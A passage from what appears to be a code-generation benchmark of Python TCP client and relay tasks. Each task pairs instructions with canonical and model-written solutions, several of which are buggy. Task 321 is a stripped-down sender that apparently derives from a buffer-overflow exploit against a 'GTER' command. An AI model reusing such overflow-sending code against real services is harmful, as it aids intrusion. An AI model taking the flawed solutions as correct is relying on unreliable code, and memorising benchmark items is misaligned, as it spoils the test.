             else:\n                    shell.print_exception(e)\n                    self.destroy()\n                    return False\n            return True\n        else:\n            try:\n                if self._is_local:\n                    pass\n                else:\n                    if sock == self._local_sock and self._encrypt_correct:\n                        obfs_encode = self._obfs.server_encode(data)\n                        data = obfs_encode\n                if data:\n                    l = len(data)\n                    s = sock.send(data)\n                    if s < l:\n                        data = data[s:]\n                        uncomplete = True\n                else:\n                    return\n            except (OSError, IOError) as e:\n                error_no = eventloop.errno_from_exception(e)\n                if error_no in (errno.EAGAIN, errno.EINPROGRESS, errno.EWOULDBLOCK):\n                    uncomplete = True\n                else:\n                    shell.print_exception(e)\n                    self.destroy()\n                    return False\n            except Exception as e:\n                shell.print_exception(e)\n                self.destroy()\n                return False\n        if uncomplete:\n            if sock == self._local_sock:\n                self._data_to_write_to_local.append(data)\n                self._update_stream(STREAM_DOWN, WAIT_STATUS_WRITING)\n            elif sock == self._remote_sock:\n                self._data_to_write_to_remote.append(data)\n                self._update_stream(STREAM_UP, WAIT_STATUS_WRITING)\n            else:\n                logging.error('write_all_to_sock:unknown socket')\n        else:\n            if sock == self._local_sock:\n                self._update_stream(STREAM_DOWN, WAIT_STATUS_READING)\n            elif sock == self._remote_sock:\n                self._update_stream(STREAM_UP, WAIT_STATUS_READING)\n            else:\n                logging.error('write_all_to_sock:unknown socket')\n        return True\n\n    def destroy(self):\n        if self._stage == STAGE_DESTROYED:\n            return\n        self._stage = STAGE_DESTROYED\n        if self._remote_sock:\n            try:\n                self._loop.remove(self._remote_sock)\n            except Exception as e:\n                pass\n            del self._fd_to_handlers[self._remote_sock.fileno()]\n            self._remote_sock.close()\n            self._remote_sock = None\n        if self._remote_sock_v6:\n            try:\n                self._loop.remove(self._remote_sock_v6)\n            except Exception as e:\n                pass\n            del self._fd_to_handlers[self._remote_sock_v6.fileno()]\n            self._remote_sock_v6.close()\n            self._remote_sock_v6 = None\n        if self._local_sock:\n            self._loop.remove(self._local_sock)\n            del self._fd_to_handlers[self._local_sock.fileno()]\n            self._local_sock.close()\n            self._local_sock = None\n        if self._obfs:\n            self._obfs.dispose()\n            self._obfs = None\n        if self._protocol:\n            self._protocol.dispose()\n            self._protocol = None\n        self._dns_resolver.remove_callback(self._handle_dns_resolved)\n        self._server.remove_handler(self)\n        self._server.add_connection(-1)",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import asyncio\nimport socket\nfrom typing import Dict, List, Tuple, Optional, Any\n\nclass TCPRelayHandler:\n    def __init__(self, server, fd_to_handlers, loop, local_sock, config, dns_resolver, is_local):\n        self._server = server\n        self._fd_to_handlers = fd_to_handlers\n        self._loop = loop\n        self._local_sock = local_sock\n        self._remote_sock = None\n        self._remote_sock_v6 = None\n        self._remote_udp = False\n        self._config = config\n        self._dns_resolver = dns_resolver\n        self._is_local = is_local\n        self._stage = 0\n        self._encryptor = None\n        self._encrypt_correct = False\n        self._obfs = None\n        self._protocol = None\n        self._fastopen_connected = False\n        self._data_to_write_to_local = []\n        self._data_to_write_to_remote = []\n        self._udp_data_send_buffer = b''\n        self._upstream_status = 0\n        self._downstream_status = 0\n        self._client_address = None\n        self._remote_address = None\n        self._forbidden_iplist = []\n        self._chosen_server = None\n        self.last_activity = 0\n\n    def _create_remote_socket(self, ip, port):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        sock.settimeout(30)\n        sock.connect((ip, port))\n        return sock\n\n    def _write_to_sock(self, data, sock):\n        if self._encryptor:\n            data = self._encryptor.encrypt(data)\n        if self._obfs:\n            data = self._obfs.obfuscate(data)\n        try:\n            sock.sendall(data)\n            return True\n        except Exception as e:\n            print(f\"Error writing to socket: {e}\")\n            return False\n\n    def destroy(self):\n        if self._remote_sock:\n            self._remote_sock.close()\n        if self._remote_sock_v6:\n            self._remote_sock_v6.close()\n        self._local_sock.close()\n\n    def _update_activity(self):\n        self.last_activity = self._loop.time()\n\n    def _get_a_server(self):\n        return self._server.get_server()\n\n    def _handle_dns_resolved(self, result, error):\n        if error:\n            print(f\"DNS resolution error: {error}\")\n            return\n        if result:\n            self._remote_address = (result['ip'], result['port'])\n            self._remote_sock = self._create_remote_socket(result['ip'], result['port'])\n            self._remote_sock_v6 = self._create_remote_socket(result['ipv6'], result['port'])\n\n    def _update_stream(self, stream, status):\n        pass\n\n    async def _on_local_read(self):\n        data = await self._local_sock.read(4096)\n        if data:\n            self._data_to_write_to_remote.append(data)\n            self._update_activity()\n\n    async def _on_remote_read(self):\n        data = await self._remote_sock.read(4096)\n        if data:\n            self._data_to_write_to_local.append(data)\n            self._update_activity()\n\n    async def _on_local_write(self):\n        while self._data_to_write_to_remote:\n            data = self._data_to_write_to_remote.pop(0)\n            if self._write_to_sock(data, self._remote_sock):\n                continue\n            else:\n                break\n\n    async def _on_remote_write(self):\n        while self._data_to_write_to_local:\n            data = self._data_to_write_to_local.pop(0)\n            if self._write_to_sock(data, self._local_sock):\n                continue\n            else:\n                break"
  },
  {
    "Task_id": 321,
    "Instruction": "Task Description: Create a Python function that implements a TCP client to interact with a server by sending a command with an offset and receiving the server's response.\n\nFunction Description: The function `tcp_client_interaction` establishes a TCP connection to a specified server, sends a command concatenated with an offset, receives the server's initial response, and then closes the connection. This is useful for basic client-server communication over TCP/IPv4.\n\nInput:\n- `host` (str): The IP address or hostname of the target server.\n- `port` (int): The port number on which the server is listening.\n- `cmd` (str): The command to be sent to the server.\n- `offset` (str): An offset value to be appended to the command.\n\nOutput:\n- The function prints the server's initial response to the console.\n- The function prints a confirmation message (\"Done Sending GTER with buffer\") upon successful completion.",
    "Canonical_solution": "import socket\n\ndef tcp_client_interaction(host, port, cmd, offset):\n    buffer = cmd + offset + '\\r\\n'\n    \n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((host, port))\n    data = s.recv(1024)\n    print \"\\n\" + data\n    s.send(buffer)\n    s.close()\n    print \"Done Sending GTER with buffer\"",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "right_result": "def tcp_client_interaction(host, port, cmd, offset):\n    import socket\n\n    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    client_socket.connect((host, port))\n    message = cmd + offset\n    client_socket.sendall(message.encode('utf-8'))\n    response = client_socket.recv(1024).decode('utf-8')\n    print(response)\n    print(\"Done Sending GTER with buffer\")\n    client_socket.close()"
  },
  {
    "Task_id": 323,
    "Instruction": "Task Description: Implement a TCP client class for managing connections to a server, sending and receiving commands, and handling various server messages.\n\nClass Description: The Client class provides functionality to connect to a server, send and receive commands, and maintain client state including client ID, room information, and attributes. It handles connection management, message processing, and error handling.\n\nAttributes:\n- host: str - The server host address to connect to\n- port: int - The server port to connect to\n- pending_commands: List[common.Command] - Commands waiting to be sent to the server\n- socket: Socket - The socket connection to the server\n- client_id: Optional[str] - The unique ID assigned by the server\n- current_custom_attributes: Dict[str, Any] - Attributes of the current client\n- clients_attributes: Dict[str, Dict[str, Any]] - Attributes of all connected clients\n- rooms_attributes: Dict[str, Dict[str, Any]] - Attributes of all available rooms\n- current_room: Optional[str] - The current room the client is in\n\nMethods:\n- __init__(host: str = common.DEFAULT_HOST, port: int = common.DEFAULT_PORT) -> None - Initializes the client with server connection details\n- __del__() -> None - Destructor that ensures proper disconnection\n- connect() -> None - Establishes connection to the server and requests initial data\n- disconnect() -> None - Closes the connection to the server\n- is_connected() -> bool - Returns True if connected to the server\n- send_command(command: common.Command) -> bool - Sends a command to the server\n- handle_connection_lost() -> None - Handles cleanup when connection is lost\n- fetch_incoming_commands() -> List[common.Command] - Receives and processes incoming commands from server\n- fetch_outgoing_commands(commands_send_interval: int = 0) -> None - Sends pending commands to server\n- fetch_commands(commands_send_interval: int = 0) -> List[common.Command] - Handles both incoming and outgoing commands",
    "Canonical_solution": "import socket\nimport logging\nimport time\nfrom typing import Dict, Any, Mapping, Optional, List, Callable\n\nimport mixer.broadcaster.common as common\nfrom mixer.broadcaster.socket import Socket\nfrom mixer.broadcaster.common import MessageType\nfrom mixer.broadcaster.common import update_attributes_and_get_diff, update_named_attributes\n\nclass Client:\n    def __init__(self, host: str = common.DEFAULT_HOST, port: int = common.DEFAULT_PORT):\n        self.host = host\n        self.port = port\n        self.pending_commands: List[common.Command] = []\n        self.socket: Socket = None\n        self.client_id: Optional[str] = None\n        self.current_custom_attributes: Dict[str, Any] = {}\n        self.clients_attributes: Dict[str, Dict[str, Any]] = {}\n        self.rooms_attributes: Dict[str, Dict[str, Any]] = {}\n        self.current_room: Optional[str] = None\n\n    def __del__(self):\n        if self.socket is not None:\n            self.disconnect()\n\n    def connect(self):\n        if self.is_connected():\n            raise RuntimeError(\"Client.connect : already connected\")\n\n        try:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self.socket = Socket(sock)\n            self.socket.connect((self.host, self.port))\n            self.send_command(common.Command(common.MessageType.CLIENT_ID))\n            self.send_command(common.Command(common.MessageType.LIST_CLIENTS))\n            self.send_command(common.Command(common.MessageType.LIST_ROOMS))\n        except ConnectionRefusedError:\n            self.socket = None\n        except common.ClientDisconnectedException:\n            self.handle_connection_lost()\n        except Exception as e:\n            self.socket = None\n            raise\n\n    def disconnect(self):\n        if self.socket:\n            self.socket.shutdown(socket.SHUT_RDWR)\n            self.socket.close()\n            self.socket = None\n\n    def is_connected(self):\n        return self.socket is not None\n\n    def send_command(self, command: common.Command):\n        try:\n            common.write_message(self.socket, command)\n            return True\n        except common.ClientDisconnectedException:\n            self.handle_connection_lost()\n            return False\n\n    def handle_connection_lost(self):\n        self.socket = None\n\n    def fetch_incoming_commands(self) -> List[common.Command]:\n        try:\n            received_commands = common.read_all_messages(self.socket)\n        except common.ClientDisconnectedException:\n            self.handle_connection_lost()\n            raise\n\n        for command in received_commands:\n            if command.type in self._default_command_handlers:\n                self._default_command_handlers[command.type](self, command)\n\n        return received_commands\n\n    def fetch_outgoing_commands(self, commands_send_interval=0):\n        for command in self.pending_commands:\n            if not self.send_command(command):\n                break\n            if commands_send_interval > 0:\n                time.sleep(commands_send_interval)\n        self.pending_commands = []\n\n    def fetch_commands(self, commands_send_interval=0) -> List[common.Command]:\n        self.fetch_outgoing_commands(commands_send_interval)\n        return self.fetch_incoming_commands()\n\n    _default_command_handlers: Mapping[MessageType, Callable[[common.Command], None]] = {\n        MessageType.LIST_CLIENTS: lambda self, cmd: update_named_attributes(\n            self.clients_attributes, common.decode_json(cmd.data, 0)[0]\n        ),\n        MessageType.LIST_ROOMS: lambda self, cmd: update_named_attributes(\n            self.rooms_attributes, common.decode_json(cmd.data, 0)[0]\n        ),\n        MessageType.CLIENT_ID: lambda self, cmd: setattr(self, \"client_id\", cmd.data.decode()),\n        MessageType.ROOM_UPDATE: lambda self, cmd: update_named_attributes(\n            self.rooms_attributes, common.decode_json(cmd.data, 0)[0]\n        ),\n        MessageType.ROOM_DELETED: lambda self, cmd: self.rooms_attributes.pop(common.decode_string(cmd.data, 0)[0], None),\n        MessageType.CLIENT_UPDATE: lambda self, cmd: update_named_attributes(\n            self.clients_attributes, common.decode_json(cmd.data, 0)[0]\n        ),\n        MessageType.CLIENT_DISCONNECTED: lambda self, cmd: self.clients_attributes.pop(common.decode_string(cmd.data, 0)[0], None),\n        MessageType.JOIN_ROOM: lambda self, cmd: setattr(self, \"current_room\", common.decode_string(cmd.data, 0)[0]),\n        MessageType.SEND_ERROR: lambda self, cmd: logging.error(\"Received error message : %s\", common.decode_string(cmd.data, 0)[0]),\n    }",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nfrom typing import List, Optional, Dict, Any\n\nclass Client:\n    def __init__(self, host: str = \"common.DEFAULT_HOST\", port: int = \"common.DEFAULT_PORT\") -> None:\n        self.host = host\n        self.port = port\n        self.pending_commands: List[common.Command] = []\n        self.socket: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.client_id: Optional[str] = None\n        self.current_custom_attributes: Dict[str, Any] = {}\n        self.clients_attributes: Dict[str, Dict[str, Any]] = {}\n        self.rooms_attributes: Dict[str, Dict[str, Any]] = {}\n        self.current_room: Optional[str] = None\n\n    def __del__(self) -> None:\n        self.disconnect()\n\n    def connect(self) -> None:\n        try:\n            self.socket.connect((self.host, self.port))\n            self.socket.settimeout(10)\n            self.fetch_incoming_commands()\n        except Exception as e:\n            print(f\"Connection error: {e}\")\n\n    def disconnect(self) -> None:\n        if self.is_connected():\n            self.socket.close()\n            self.handle_connection_lost()\n\n    def is_connected(self) -> bool:\n        return self.socket.fileno() != -1\n\n    def send_command(self, command: common.Command) -> bool:\n        if not self.is_connected():\n            return False\n        try:\n            self.socket.sendall(command.to_bytes())\n            return True\n        except Exception as e:\n            print(f\"Send command error: {e}\")\n            return False\n\n    def handle_connection_lost(self) -> None:\n        self.socket.close()\n        self.client_id = None\n        self.current_room = None\n\n    def fetch_incoming_commands(self) -> List[common.Command]:\n        commands = []\n        try:\n            while True:\n                data = self.socket.recv(1024)\n                if not data:\n                    break\n                command = common.Command.from_bytes(data)\n                commands.append(command)\n        except Exception as e:\n            print(f\"Receive command error: {e}\")\n        return commands\n\n    def fetch_outgoing_commands(self, commands_send_interval: int = 0) -> None:\n        if commands_send_interval > 0 and len(self.pending_commands) > 0:\n            self.send_command(self.pending_commands.pop(0))\n\n    def fetch_commands(self, commands_send_interval: int = 0) -> List[common.Command]:\n        incoming = self.fetch_incoming_commands()\n        self.fetch_outgoing_commands(commands_send_interval)\n        return incoming"
  },
  {
    "Task_id": 324,
    "Instruction": "Task Description: Implement a TCP relay handler class that manages communication between a local socket and a remote socket, handling encryption, obfuscation, and protocol-specific operations.\n\nClass Description: The TCPRelayHandler class is responsible for managing the bidirectional communication between a local client and a remote server. It handles socket creation, connection establishment, data encryption/decryption, obfuscation, and protocol-specific operations. The class uses event-driven programming to manage socket events efficiently.\n\nAttributes:\n\n- _server: [object] - Reference to the parent server instance\n- _fd_to_handlers: [dict] - Mapping of file descriptors to their handler instances\n- _loop: [object] - Event loop instance for managing socket events\n- _local_sock: [socket.socket] - Local client socket\n- _remote_sock: [socket.socket] - Remote server socket\n- _config: [dict] - Configuration parameters\n- _dns_resolver: [object] - DNS resolver instance\n- _is_local: [bool] - Flag indicating if this is a local handler\n- _stage: [int] - Current connection stage\n- _encryptor: [object] - Encryption/decryption handler\n- _client_address: [tuple] - Client address (IP, port)\n- _obfs: [object] - Obfuscation handler\n- _protocol: [object] - Protocol handler\n- _local_sock_fd: [int] - Local socket file descriptor\n- _remote_sock_fd: [int] - Remote socket file descriptor\n- _remote_address: [tuple] - Remote server address (IP, port)\n- _data_to_write_to_remote: [list] - Buffer for data to be sent to remote\n\nMethods:\n\n- __init__(server, fd_to_handlers, loop, local_sock, config, dns_resolver, is_local) -> [None] - Initializes the handler with server references, sockets, and configuration\n- _create_remote_socket(ip, port) -> [socket.socket] - Creates and configures a remote socket\n- _handle_dns_resolved(result, error) -> [None] - Handles DNS resolution result\n- _write_to_sock(data, sock) -> [bytes/None] - Writes data to specified socket\n- _on_local_read() -> [None] - Handles incoming data from local socket\n- _on_remote_read() -> [None] - Handles incoming data from remote socket\n- _on_remote_write() -> [None] - Handles write events for remote socket\n- handle_event(sock, fd, event) -> [bool] - Processes socket events\n- destroy() -> [None] - Cleans up resources and closes sockets",
    "Canonical_solution": "import socket\nimport errno\nimport struct\nimport logging\nimport binascii\nimport common\nimport obfs\nimport encrypt\nimport eventloop\nimport lru_cache\n\nclass TCPRelayHandler:\n    def __init__(self, server, fd_to_handlers, loop, local_sock, config, dns_resolver, is_local):\n        self._server = server\n        self._fd_to_handlers = fd_to_handlers\n        self._loop = loop\n        self._local_sock = local_sock\n        self._remote_sock = None\n        self._config = config\n        self._dns_resolver = dns_resolver\n        self._is_local = is_local\n        self._stage = STAGE_INIT\n        self._create_encryptor(config)\n        self._client_address = local_sock.getpeername()[:2]\n        self._update_tcp_mss(local_sock)\n        self._obfs = obfs.obfs(config['obfs'])\n        self._protocol = obfs.obfs(config['protocol'])\n        self._setup_server_info()\n        local_sock.setblocking(False)\n        self._local_sock_fd = local_sock.fileno()\n        fd_to_handlers[self._local_sock_fd] = self\n        loop.add(local_sock, eventloop.POLL_IN | eventloop.POLL_ERR, self._server)\n\n    def _create_remote_socket(self, ip, port):\n        addrs = socket.getaddrinfo(ip, port, 0, socket.SOCK_STREAM, socket.SOL_TCP)\n        af, socktype, proto, canonname, sa = addrs[0]\n        remote_sock = socket.socket(af, socktype, proto)\n        remote_sock.setblocking(False)\n        remote_sock.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)\n        self._remote_sock = remote_sock\n        self._remote_sock_fd = remote_sock.fileno()\n        self._fd_to_handlers[self._remote_sock_fd] = self\n        return remote_sock\n\n    def _handle_dns_resolved(self, result, error):\n        if error:\n            self.destroy()\n            return\n        if result:\n            ip = result[1]\n            if ip:\n                try:\n                    remote_sock = self._create_remote_socket(ip, self._remote_address[1])\n                    remote_sock.connect((ip, self._remote_address[1]))\n                    self._loop.add(remote_sock, eventloop.POLL_ERR | eventloop.POLL_OUT, self._server)\n                    self._stage = STAGE_CONNECTING\n                except Exception as e:\n                    self.destroy()\n\n    def _write_to_sock(self, data, sock):\n        try:\n            if sock == self._remote_sock:\n                self._update_activity(len(data))\n                sent = sock.send(data)\n                if sent < len(data):\n                    return data[sent:]\n            return None\n        except (OSError, IOError) as e:\n            error_no = eventloop.errno_from_exception(e)\n            if error_no not in (errno.EAGAIN, errno.EINPROGRESS, errno.EWOULDBLOCK):\n                self.destroy()\n            return data\n\n    def _on_local_read(self):\n        try:\n            data = self._local_sock.recv(BUF_SIZE)\n            if not data:\n                self.destroy()\n                return\n            if self._is_local:\n                if self._encryptor is not None:\n                    data = self._protocol.client_pre_encrypt(data)\n                    data = self._encryptor.encrypt(data)\n                    data = self._obfs.client_encode(data)\n            self._write_to_sock(data, self._remote_sock)\n        except (OSError, IOError) as e:\n            error_no = eventloop.errno_from_exception(e)\n            if error_no not in (errno.EAGAIN, errno.EWOULDBLOCK):\n                self.destroy()\n\n    def _on_remote_read(self):\n        try:\n            data = self._remote_sock.recv(BUF_SIZE)\n            if not data:\n                self.destroy()\n                return\n            if self._is_local:\n                obfs_decode = self._obfs.client_decode(data)\n                data = self._encryptor.decrypt(obfs_decode[0])\n                data = self._protocol.client_post_decrypt(data)\n            self._write_to_sock(data, self._local_sock)\n        except (OSError, IOError) as e:\n            error_no = eventloop.errno_from_exception(e)\n            if error_no not in (errno.EAGAIN, errno.EWOULDBLOCK):\n                self.destroy()\n\n    def _on_remote_write(self):\n        self._stage = STAGE_STREAM\n        if self._data_to_write_to_remote:\n            data = b''.join(self._data_to_write_to_remote)\n            self._data_to_write_to_remote = []\n            remaining = self._write_to_sock(data, self._remote_sock)\n            if remaining is not None:\n                self._data_to_write_to_remote.append(remaining)\n\n    def handle_event(self, sock, fd, event):\n        if fd == self._remote_sock_fd:\n            if event & eventloop.POLL_ERR:\n                self.destroy()\n            elif event & eventloop.POLL_IN:\n                self._on_remote_read()\n            elif event & eventloop.POLL_OUT:\n                self._on_remote_write()\n        elif fd == self._local_sock_fd:\n            if event & eventloop.POLL_ERR:\n                self.destroy()\n            elif event & eventloop.POLL_IN:\n                self._on_local_read()\n        return True\n\n    def destroy(self):\n        if self._remote_sock:\n            self._loop.removefd(self._remote_sock_fd)\n            del self._fd_to_handlers[self._remote_sock_fd]\n            self._remote_sock.close()\n        if self._local_sock:\n            self._loop.removefd(self._local_sock_fd)\n            del self._fd_to_handlers[self._local_sock_fd]\n            self._local_sock.close()\n        self._server.remove_handler(self)",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import asyncio\nimport socket\n\nclass TCPRelayHandler:\n    def __init__(self, server, fd_to_handlers, loop, local_sock, config, dns_resolver, is_local):\n        self._server = server\n        self._fd_to_handlers = fd_to_handlers\n        self._loop = loop\n        self._local_sock = local_sock\n        self._config = config\n        self._dns_resolver = dns_resolver\n        self._is_local = is_local\n        self._stage = 0\n        self._encryptor = None\n        self._client_address = None\n        self._obfs = None\n        self._protocol = None\n        self._local_sock_fd = local_sock.fileno()\n        self._remote_sock = None\n        self._remote_sock_fd = -1\n        self._remote_address = None\n        self._data_to_write_to_remote = []\n\n    def _create_remote_socket(self, ip, port):\n        remote_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        remote_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        remote_sock.connect((ip, port))\n        return remote_sock\n\n    def _handle_dns_resolved(self, result, error):\n        if error:\n            print(f\"DNS resolution error: {error}\")\n            return\n        if result:\n            self._remote_address = (result[0], result[1])\n            self._remote_sock = self._create_remote_socket(result[0], result[1])\n            self._remote_sock_fd = self._remote_sock.fileno()\n            self._server._fd_to_handlers[self._remote_sock_fd] = self\n            self._loop.add_reader(self._remote_sock.fileno(), self._on_remote_read)\n            self._stage = 1\n        else:\n            print(\"No DNS resolution result\")\n\n    def _write_to_sock(self, data, sock):\n        try:\n            return sock.send(data)\n        except Exception as e:\n            print(f\"Error writing to socket: {e}\")\n            return None\n\n    def _on_local_read(self):\n        data = self._local_sock.recv(4096)\n        if data:\n            self._data_to_write_to_remote.append(data)\n            self._on_remote_write()\n\n    def _on_remote_read(self):\n        data = self._remote_sock.recv(4096)\n        if data:\n            self._data_to_write_to_remote.append(data)\n            self._on_remote_write()\n\n    def _on_remote_write(self):\n        if self._data_to_write_to_remote:\n            data = b''.join(self._data_to_write_to_remote)\n            self._data_to_write_to_remote.clear()\n            self._write_to_sock(data, self._remote_sock)\n\n    def handle_event(self, sock, fd, event):\n        if event & asyncio.READABLE_PIPE:\n            if sock == self._local_sock:\n                self._on_local_read()\n            elif sock == self._remote_sock:\n                self._on_remote_read()\n        elif event & asyncio.WRITABLE_PIPE:\n            self._on_remote_write()\n        return True\n\n    def destroy(self):\n        if self._remote_sock:\n            self._remote_sock.close()\n        self._local_sock.close()"
  },
  {
    "Task_id": 326,
    "Instruction": "Task Description: Create a Python class that acts as a TCP client to interact with a Zookeeper server, retrieve statistics, and parse them into a structured format.\n\nClass Description: The ZookeeperTCPClient class provides functionality to connect to a Zookeeper server via TCP (either IPv4 or Unix socket), send commands, receive statistics, and parse them into a dictionary format while handling connection errors gracefully.\n\nAttributes: \n[No explicit attributes are defined in the class, as it's primarily method-based]\n\nMethods:\n\nMethod1: get_raw_stats(host, port) -> str - \nEstablishes a TCP connection to the specified Zookeeper server (either via IPv4 or Unix socket), sends the 'mntr' command, and returns the raw statistics data as a string.\nInput:\n- host: str - The server hostname/IP address or Unix socket path\n- port: str/int - The server port number (None for Unix socket connections)\nOutput:\n- str - Raw statistics data received from the server\n\nMethod2: get_stats(host, port) -> dict - \nRetrieves raw statistics using get_raw_stats(), parses them into a structured dictionary format while ignoring certain predefined fields, and attempts to find maximum connection limit from process information.\nInput:\n- host: str - The server hostname/IP address or Unix socket path\n- port: str/int - The server port number (None for Unix socket connections)\nOutput:\n- dict - Parsed statistics with metric names as keys and their values as values",
    "Canonical_solution": "import socket\nimport re\n\nclass ZookeeperTCPClient:\n    def __init__(self):\n        pass\n\n    def get_raw_stats(self, host, port):\n        data = ''\n        try:\n            if port is None:\n                sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n                sock.connect(host)\n            else:\n                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                sock.connect((host, int(port)))\n            sock.send('mntr\\n')\n            data = sock.recv(4096)\n        except socket.error:\n            raise Exception('Failed to get stats from %s:%s' % (host, port))\n        finally:\n            sock.close()\n        return data\n\n    def get_stats(self, host, port):\n        ignored = ('zk_version', 'zk_server_state')\n        pid = None\n        stats = {}\n        data = self.get_raw_stats(host, port)\n\n        for line in data.splitlines():\n            pieces = line.split()\n            if pieces[0] in ignored:\n                continue\n            stats[pieces[0]] = pieces[1]\n\n        try:\n            cmdline = \"/proc/%s/cmdline\" % pid\n            f = open(cmdline, 'r')\n            m = re.search(\"-c\\x00(\\d+)\", f.readline())\n            if m is not None:\n                stats['limit_maxconn'] = m.group(1)\n            f.close()\n        except:\n            pass\n\n        return stats",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\n\nclass ZookeeperTCPClient:\n    def get_raw_stats(self, host, port):\n        try:\n            if port is None:\n                sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n                sock.connect(host)\n            else:\n                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                sock.connect((host, port))\n            sock.sendall(b'mntr\\n')\n            response = sock.recv(4096).decode('utf-8')\n            sock.close()\n            return response\n        except Exception as e:\n            return str(e)\n\n    def get_stats(self, host, port):\n        raw_stats = self.get_raw_stats(host, port)\n        if \"Connection refused\" in raw_stats:\n            return {\"error\": \"Connection refused\"}\n        stats = {}\n        lines = raw_stats.strip().split('\\n')\n        for line in lines:\n            if line:\n                key, value = line.split(':', 1)\n                key = key.strip()\n                value = value.strip()\n                if key not in ['client_pings', 'client_outstanding_requests', 'client_connections']:\n                    stats[key] = value\n        try:\n            max_connections = int(stats.get('max_connections', 0))\n            stats['max_connections'] = max_connections\n        except ValueError:\n            pass\n        return stats"
  },
  {
    "Task_id": 331,
    "Instruction": "Task Description: Implement a TCP client class for communicating with an Android device through an ADB bridge, handling connection management, data transmission, and error recovery.\n\nClass Description: AdbConnector - A class that establishes and maintains a TCP connection to an Android device via ADB bridge, providing methods for sending requests and receiving responses.\n\nAttributes:\n- adb_host: str - The host address where ADB is running (default: 'localhost')\n- socket: socket - The TCP socket object for communication\n- packet_buffer: bytes - Buffer for storing incomplete packets\n- _disposed: bool - Flag indicating whether the connection has been closed\n- adb_proc: Popen - Subprocess object for the ADB bridge process\n\nMethods:\n- __init__(adb_host: str = 'localhost') -> None - Initializes the ADB connector with the specified host\n- _relaunch_adb_bridge() -> None - Restarts the ADB bridge connection when needed\n- send_request(packet_type: int, packet_payload: bytes) -> None - Sends a request packet to the device\n- read_loop() -> None - Continuously reads and processes incoming data from the device\n- dispose(disposing: bool = True) -> None - Cleans up resources and closes the connection",
    "Canonical_solution": "from subprocess import Popen, run, PIPE, DEVNULL, STDOUT, TimeoutExpired, list2cmdline\nfrom socket import socket, AF_INET, SOCK_STREAM\nfrom functools import partial\nfrom typing import Optional\nfrom os.path import exists\nfrom re import search\n\nQCSUPER_TCP_PORT = 43555\n\nclass AdbConnector:\n    def __init__(self, adb_host: str = 'localhost'):\n        self.adb_host = adb_host\n        self.socket = socket(AF_INET, SOCK_STREAM)\n        self.packet_buffer = b''\n        self._disposed = False\n\n    def _relaunch_adb_bridge(self):\n        if hasattr(self, 'adb_proc'):\n            self.adb_proc.terminate()\n        \n        run_safe([self.adb_exe, 'forward', 'tcp:' + str(QCSUPER_TCP_PORT), 'tcp:' + str(QCSUPER_TCP_PORT)], check = True,\n                stdout = DEVNULL, stdin = DEVNULL)\n        \n        self.adb_proc = Popen([self.adb_exe, 'exec-out' if self.can_use_exec_out else 'shell', self.su_command % (ANDROID_TMP_DIR + '/adb_bridge')],\n            stdin = DEVNULL, stdout = PIPE, stderr = STDOUT,\n            preexec_fn = (lambda: partial(drop_privileges, True)) if drop_privileges else None,\n            bufsize = 0, universal_newlines = True\n        )\n    \n        for line in self.adb_proc.stdout:\n            if 'Connection to Diag established' in line:\n                break\n            else:\n                warning('Unexpected adb_bridge output: ' + line)\n\n        self.socket = socket(AF_INET, SOCK_STREAM)\n\n        try:\n            self.socket.connect((self.adb_host, QCSUPER_TCP_PORT))\n        except Exception:\n            self.adb_proc.terminate()\n            error('Could not communicate with the adb_bridge through TCP')\n            exit()\n        \n        self.received_first_packet = False\n\n    def send_request(self, packet_type, packet_payload):\n        raw_payload = self.hdlc_encapsulate(bytes([packet_type]) + packet_payload\n        self.socket.send(raw_payload)\n\n    def read_loop(self):\n        while True:\n            while self.TRAILER_CHAR not in self.packet_buffer:\n                socket_read = self.socket.recv(1024 * 1024 * 10)\n                \n                if not socket_read and platform in ('cygwin', 'win32'):\n                    self._relaunch_adb_bridge()\n                    \n                    if not self.program_is_terminating:\n                        with self.shutdown_event:\n                            self.shutdown_event.notify()\n                    \n                    socket_read = self.socket.recv(1024 * 1024 * 10)\n                \n                if not socket_read:\n                    error('\\nThe connection to the adb bridge was closed, or ' +\n                        'preempted by another QCSuper instance')\n                    return\n                \n                self.packet_buffer += socket_read\n            \n            while self.TRAILER_CHAR in self.packet_buffer:\n                raw_payload, self.packet_buffer = self.packet_buffer.split(self.TRAILER_CHAR, 1)\n                \n                try:\n                    unframed_message = self.hdlc_decapsulate(\n                        payload = raw_payload + self.TRAILER_CHAR\n                    )\n                except self.InvalidFrameError:\n                    continue\n                finally:\n                    self.received_first_packet = True\n                \n                self.dispatch_received_diag_packet(unframed_message)\n\n    def dispose(self, disposing=True):\n        if not self._disposed:\n            if hasattr(self, 'adb_proc'):\n                self.adb_proc.terminate()\n            self._disposed = True",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
